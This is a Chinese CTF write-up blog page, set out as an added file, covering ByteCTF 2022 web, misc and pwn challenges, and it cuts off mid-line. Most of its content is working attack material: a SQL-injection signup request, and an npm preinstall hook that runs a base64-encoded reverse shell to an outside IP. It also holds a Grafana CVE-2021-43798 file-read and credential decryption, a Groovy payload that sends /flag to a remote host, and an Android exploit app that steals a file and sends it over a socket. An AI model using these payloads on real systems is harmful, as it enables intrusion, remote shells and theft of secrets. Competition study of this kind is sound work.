@@ -1,0 +1,241 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2022 ByteCTF By EDISEC | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="ByteCTF 9 大题：SQLi+npm preinstall RCE+Grafana CVE+Groovy+sysdig">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2022 ByteCTF By EDISEC">
+<meta property="og:url" content="https://pudong617.github.io/2022/01/01/ctf-kb/wp/Web/2022_ByteCTF_By_EDISEC/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="ByteCTF 9 大题：SQLi+npm preinstall RCE+Grafana CVE+Groovy+sysdig">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2021-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="SQLi-users-signup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2022/01/01/ctf-kb/wp/Web/2022_ByteCTF_By_EDISEC/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2022 ByteCTF By EDISEC',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2022 ByteCTF By EDISEC</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-12-31T16:00:00.000Z" title="发表于 2022-01-01 00:00:00">2022-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-12-31T16:00:00.000Z" title="更新于 2022-01-01 00:00:00">2022-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Web/">Web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2022 ByteCTF By EDISEC"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/59101.html">https://www.ctfiot.com/59101.html</a><br>ID: 59101</p>
+</blockquote>
+<p>EDI</p>
+<p>JOIN US ▶▶▶</p>
+<p>招新</p>
+<p>EDI安全的CTF战队经常参与各大CTF比赛，了解CTF赛事。</p>
+<p>欢迎各位师傅加入EDI，大家一起打CTF，一起进步。（诚招re crypto pwn misc方向的师傅）</p>
+<p>有意向的师傅请联系邮箱<a href="mailto:&#x72;&#x6f;&#x6f;&#116;&#x40;&#101;&#x64;&#x69;&#115;&#101;&#99;&#x2e;&#x6e;&#x65;&#x74;">&#x72;&#x6f;&#x6f;&#116;&#x40;&#101;&#x64;&#x69;&#115;&#101;&#99;&#x2e;&#x6e;&#x65;&#x74;</a>、<a href="mailto:&#115;&#x68;&#105;&#x79;&#x69;&#64;&#x65;&#100;&#x69;&#x73;&#x65;&#99;&#x2e;&#x6e;&#101;&#x74;">&#115;&#x68;&#105;&#x79;&#x69;&#64;&#x65;&#100;&#x69;&#x73;&#x65;&#99;&#x2e;&#x6e;&#101;&#x74;</a>（带上自己的简历，简历内容包括但不限于就读学校、个人ID、擅长技术方向、历史参与比赛成绩等等。</p>
+<p>点击蓝字 ·  关注我们</p>
+<p>01</p>
+<p>Web</p>
+<p>1</p>
+<p>ctf_cloud</p>
+<p>POST &#x2F;users&#x2F;signup HTTP&#x2F;1.1Host: e0415807b2fc449027075f27a3cfe1e3.2022.capturetheflag.funUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko&#x2F;20100101Firefox&#x2F;83.0Accept: *&#x2F;*Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateContent-Type: application&#x2F;jsonContent-Length: 59Origin: <a target="_blank" rel="noopener" href="http://127.0.0.1connection/">http://127.0.0.1Connection</a>: closeReferer: <a target="_blank" rel="noopener" href="http://127.0.0.1/Cookie">http://127.0.0.1/Cookie</a>: PHPSESSID&#x3D;hftcgqq32s0or9hk89huvooo8p; connect.sid&#x3D;s%3ApoFqQ8ErhSogbVMNdzwMcanbixoxlw3.l8FFINAquYbE9luPWO7uONwPJbat4BzzzG6W9GPCkswSec-Fetch-Dest: emptySec-Fetch-Mode: corsSec-Fetch-Site: same-originX-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1{“username”:”bcasd”,”password”:”su’,1),(‘admin’,’su’,1)–”}</p>
+<p>POST &#x2F;dashboard&#x2F;upload HTTP&#x2F;1.1Host: e0415807b2fc449027075f27a3cfe1e3.2022.capturetheflag.funUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko&#x2F;20100101Firefox&#x2F;83.0Accept:<br>text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateContent-Type: multipart&#x2F;form-data; boundary&#x3D;—-WebKitFormBoundaryu3fv4Bf4rz9XvGktContent-Length: 330Origin: <a target="_blank" rel="noopener" href="http://127.0.0.1connection/">http://127.0.0.1Connection</a>: closeReferer: <a target="_blank" rel="noopener" href="http://127.0.0.1/Cookie">http://127.0.0.1/Cookie</a>:<br>connect.sid&#x3D;s%3A5zWp5eJF_cVlAadIxtC4gKiYlNG44Cs2.lDEXcfzsDuR7XUusa%2FMkld55S%2FNmj4uA%2FVZKIgXK0IwUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: same-originSec-Fetch-User: ?1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1——WebKitFormBoundaryu3fv4Bf4rz9XvGktContent-Disposition: form-data; name&#x3D;”c”;filename&#x3D;”package.json”{“name”: “userapp”,”version”: “0.0.1”,”scripts”: {“preinstall”: “echoYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjYuNTkuMTM3LzIzMzMgMD4mMQ&#x3D;&#x3D;|base64 -d|bash”} }——WebKitFormBoundaryu3fv4Bf4rz9XvGkt–</p>
+<p>POST &#x2F;dashboard&#x2F;dependencies HTTP&#x2F;1.1Host: e0415807b2fc449027075f27a3cfe1e3.2022.capturetheflag.funUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko&#x2F;20100101Firefox&#x2F;83.0Accept:<br>text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateOrigin: <a target="_blank" rel="noopener" href="http://127.0.0.1connection/">http://127.0.0.1Connection</a>: closeReferer: <a target="_blank" rel="noopener" href="http://127.0.0.1/Cookie">http://127.0.0.1/Cookie</a>:<br>connect.sid&#x3D;s%3A5zWp5eJF_cVlAadIxtC4gKiYlNG44Cs2.lDEXcfzsDuR7XUusa%2FMkld55S%2FNmj4uA%2FVZKIgXK0IwUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: same-originSec-Fetch-User: ?1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1Content-Type: application&#x2F;jsonContent-Length: 48{“dependencies”:{“su”:”file:.&#x2F;public&#x2F;uploads&#x2F;“}}</p>
+<p>2</p>
+<p>easy_grafana</p>
+<p>GET &#x2F;public&#x2F;plugins&#x2F;text&#x2F;#&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;&#x2F;etc&#x2F;grafana&#x2F;grafana.iniHTTP&#x2F;1.1GET &#x2F;public&#x2F;plugins&#x2F;text&#x2F;#&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;&#x2F;var&#x2F;lib&#x2F;grafana&#x2F;grafana.dbHTTP&#x2F;1.1</p>
+<p>使⽤这个的解密⽂件进⾏解密得到flag</p>
+<p>GitHub - pedrohavay&#x2F;exploit-grafana-CVE-2021-43798: This is a proof-of-concept exploit for Grafana’sUnauthorized Arbitrary File Read Vulnerability (CVE-2021-43798).</p>
+<p>from secure import decryptimport base64secret_key &#x3D; ‘SW2YcwTIb9zpO1hoPsMm’ciphertext &#x3D; ‘b0NXeVJoSXKPoSYIWt8i&#x2F;GfPreRT03fO6gbMhzkPefodqe1nvGpdSROTvfHK1I3kzZy9SQnuVy9c3lVkvbyJcqRwNT6&#x2F;‘encrypted &#x3D; base64.b64decode(ciphertext.encode())pwdBytes, _ &#x3D; decrypt(encrypted, secret_key)print(pwdBytes)</p>
+<p>02</p>
+<p>Misc</p>
+<p>1</p>
+<p>survey</p>
+<p>2</p>
+<p>bash_game</p>
+<p>exp</p>
+<p>arr[$(cat &#x2F;flag)]</p>
+<p>3</p>
+<p>easy_groovy</p>
+<p>def f &#x3D; new File(“&#x2F;flag”).textdef res1 &#x3D; new URL(‘<a target="_blank" rel="noopener" href="http://ip/">http://ip</a>:<br>1234&#x2F;1’+f).text</p>
+<p>4</p>
+<p>signin</p>
+<p>签到 直接&#x2F;final签到 抓包爆破队伍名和id</p>
+<p>5</p>
+<p>find_it</p>
+<p><a target="_blank" rel="noopener" href="https://www.howtoing.com/how-to-monitor-your-ubuntu-16-04-system-with-sysdig/">https://www.howtoing.com/how-to-monitor-your-ubuntu-16-04-system-with-sysdig/</a></p>
+<p>然后去查findit.txt看看有什么操作。翻了很久发现上传了⼀个奇怪的php⽂件。</p>
+<p>05</p>
+<p>Pwn</p>
+<p>1</p>
+<p>Bronze Droid</p>
+<p>和这个BabyAndroid⼀样，但是需要找到xss的替换</p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1175">https://forum.butian.net/share/1175</a></p>
+<p>然后看MainActivity，看来看去只有MainActivity ⾥⾯有个setResult函数可以</p>
+<p><a target="_blank" rel="noopener" href="https://erev0s.com/blog/exploiting-content-providers-through-an-insecure-setresult-implementation/">https://erev0s.com/blog/exploiting-content-providers-through-an-insecure-setresult-implementation/</a></p>
+<p>package com.bytectf.pwnbronzedroid;<br>import android.app.Activity;<br>import android.content.ContentValues;<br>import android.content.Intent;<br>import android.net.Uri;<br>import android.os.Bundle;<br>import android.provider.MediaStore;<br>import android.util.Log;<br>import android.widget.Toast;<br>import java.io.BufferedReader;<br>import java.io.ByteArrayOutputStream;<br>import java.io.InputStream;<br>import java.io.InputStreamReader;<br>import java.io.OutputStream;<br>import java.net.InetSocketAddress;<br>import java.net.Socket;<br>import java.net.SocketAddress;<br>public class MainActivity extends Activity {&#x2F;&#x2F; 参考 <a target="_blank" rel="noopener" href="https://forum.butian.net/share/1175">https://forum.butian.net/share/1175</a> @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); Intent intent &#x3D; new Intent(“ACTION_SHARET_TO_ME”); intent.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION | Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION); &#x2F;&#x2F; 这里往后参考 <a target="_blank" rel="noopener" href="https://erev0s.com/blog/exploiting-content-providers-through-an-insecure-setresult-implementation/">https://erev0s.com/blog/exploiting-content-providers-through-an-insecure-setresult-implementation/</a> intent.setClassName(“com.bytectf.bronzedroid”, “com.bytectf.bronzedroid.MainActivity”); intent.setData(Uri.parse(“content:&#x2F;&#x2F;com.bytectf.bronzedroid.fileprovider&#x2F;root&#x2F;data&#x2F;data&#x2F;com.bytectf.bronzedroid&#x2F;files&#x2F;flag”)); startActivityForResult(intent,0); }</p>
+<p>&#x2F;&#x2F; 这部分参考 <a target="_blank" rel="noopener" href="https://forum.butian.net/share/1175">https://forum.butian.net/share/1175</a> 对onActivityResult 进行魔改 protected void onActivityResult(int requestCode, int resultCode, Intent data) { super.onActivityResult(requestCode, resultCode, data); try { InputStream is &#x3D; getContentResolver().openInputStream(data.getData()); BufferedReader br &#x3D; new BufferedReader(new InputStreamReader(is)); StringBuilder sb &#x3D; new StringBuilder(); String line; while ((line &#x3D; br.readLine()) !&#x3D; null) { sb.append(line); } is.close(); br.close(); String flag &#x3D; sb.toString(); new Thread(new Runnable() { @Override public void run() { try { if (true) { Socket sk &#x3D; new Socket(); SocketAddress address &#x3D; new InetSocketAddress(“ip”, 1235); sk.connect(address, 5000); sk.setTcpNoDelay(true); sk.setKeepAlive(true); OutputStream os &#x3D; sk.getOutputStream(); os.write(flag.getBytes()); os.flush(); os.close(); sk.close(); Thread.sleep(1000); } } catch (Exception e) { Log.e(“FlagHunter_Err”,e.toString()); } } }).start(); } catch ( Exception e) { throw new RuntimeException(e); } }}</p>
+<p>在服务器开⼀个http服务，提供下载apk。</p>
+<p>from hashlib import *import itertoolsimport stringfrom Crypto.Hash import SHA256import itertoolsALPHABET &#x3D; string.ascii_letters + string.digitssuffix &#x3D; ‘Zfecpd’digest &#x3D; ‘5782089877f9ff411d7d6276df447eca181fc5a27dc3fadc5a0d68a0aa555581’print(f”suffix: {suffix}ndigest: {digest}”)for i in itertools.product(ALPHABET,repeat&#x3D;4): prefix &#x3D; ‘’.join(i) guess &#x3D; suffix + prefix if sha256(guess.encode()).hexdigest() &#x3D;&#x3D; digest: print(f”Find XXXX: {prefix}”) break</p>
+<p>EDI安全</p>
+<p>扫二维码｜关注我们</p>
+<p>一个专注渗透实战经验分享的公众号</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">POST /users/signup HTTP/1.1Host: e0415807b2fc449027075f27a3cfe1e3.2022.capturetheflag.funUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101Firefox/83.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/jsonContent-Length: 59Origin: http://127.0.0.1Connection: closeReferer: http://127.0.0.1/Cookie: PHPSESSID=hftcgqq32s0or9hk89huvooo8p; connect.sid=s%3ApoFqQ8ErhSogbVMNdzwMcanbixoxlw3.l8FFINAquYbE9luPWO7uONwPJbat4BzzzG6W9GPCkswSec-Fetch-Dest: emptySec-Fetch-Mode: corsSec-Fetch-Site: same-originX-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1&#123;&quot;username&quot;:&quot;bcasd&quot;,&quot;password&quot;:&quot;su&#x27;,1),(&#x27;admin&#x27;,&#x27;su&#x27;,1)--&quot;&#125;</span><br><span class="line">POST /dashboard/upload HTTP/1.1Host: e0415807b2fc449027075f27a3cfe1e3.2022.capturetheflag.funUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101Firefox/83.0Accept:</span><br><span class="line">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryu3fv4Bf4rz9XvGktContent-Length: 330Origin: http://127.0.0.1Connection: closeReferer: http://127.0.0.1/Cookie:</span><br><span class="line">connect.sid=s%3A5zWp5eJF_cVlAadIxtC4gKiYlNG44Cs2.lDEXcfzsDuR7XUusa%2FMkld55S%2FNmj4uA%2FVZKIgXK0IwUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: same-originSec-Fetch-User: ?1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1------WebKitFormBoundaryu3fv4Bf4rz9XvGktContent-Disposition: form-data; name=&quot;c&quot;;filename=&quot;package.json&quot;&#123;&quot;name&quot;: &quot;userapp&quot;,&quot;version&quot;: &quot;0.0.1&quot;,&quot;scripts&quot;: &#123;&quot;preinstall&quot;: &quot;echoYmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjYuNTkuMTM3LzIzMzMgMD4mMQ==|base64 -d|bash&quot;&#125; &#125;------WebKitFormBoundaryu3fv4Bf4rz9XvGkt--</span><br><span class="line">POST /dashboard/dependencies HTTP/1.1Host: e0415807b2fc449027075f27a3cfe1e3.2022.capturetheflag.funUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101Firefox/83.0Accept:</span><br><span class="line">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateOrigin: http://127.0.0.1Connection: closeReferer: http://127.0.0.1/Cookie:</span><br><span class="line">connect.sid=s%3A5zWp5eJF_cVlAadIxtC4gKiYlNG44Cs2.lDEXcfzsDuR7XUusa%2FMkld55S%2FNmj4uA%2FVZKIgXK0IwUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: same-originSec-Fetch-User: ?1X-Forwarded-For: 127.0.0.1X-Originating-IP: 127.0.0.1X-Remote-IP: 127.0.0.1X-Remote-Addr: 127.0.0.1Content-Type: application/jsonContent-Length: 48&#123;&quot;dependencies&quot;:&#123;&quot;su&quot;:&quot;file:./public/uploads/&quot;&#125;&#125;</span><br><span class="line">GET /public/plugins/text/#/../../../../../../../../../..//etc/grafana/grafana.iniHTTP/1.1GET /public/plugins/text/#/../../../../../../../../../..//var/lib/grafana/grafana.dbHTTP/1.1</span><br><span class="line">GitHub - pedrohavay/exploit-grafana-CVE-2021-43798: This is a proof-of-concept exploit for Grafana&#x27;sUnauthorized Arbitrary File Read Vulnerability (CVE-2021-43798).</span><br><span class="line">from secure import decryptimport base64secret_key = 